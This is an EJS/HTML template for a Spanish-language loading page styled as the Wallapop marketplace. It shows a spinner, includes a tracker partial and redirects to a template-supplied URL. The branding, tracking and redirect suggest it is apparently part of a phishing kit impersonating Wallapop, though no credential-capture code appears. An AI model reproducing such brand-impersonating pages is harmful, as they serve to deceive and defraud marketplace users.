<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallapop - Cargando</title>
    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
    <%- include('partials/tracker') %>
    <meta http-equiv="refresh" content="<%=time%>; url=<%=url%>">
    <link rel="stylesheet" href="/css/wallapop.css">
    <style>
      .spinner {
        border: 4px solid #edf1f3;
        border-top: 4px solid var(--wlp-teal, #13c1ac);
        border-radius: 50%;
        width: 56px;
        height: 56px;
        animation: spin 1s linear infinite;
        margin: 0 auto 20px;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      .loading-text {
        font-size: 16px;
        font-weight: 500;
        text-align: center;
        color: #253238;
      }
      .loading-box {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        min-height: 55vh;
      }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
</head>
<body>
    <header class="wlp-header">
        <div class="wlp-header-inner">
            <a href="/" class="wlp-logo-link">
                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
            </a>
        </div>
    </header>
    
    <div class="loading-box">
      <div class="spinner"></div>
      <div class="loading-text">Espere, cargando...</div>
    </div>
</body>
</html>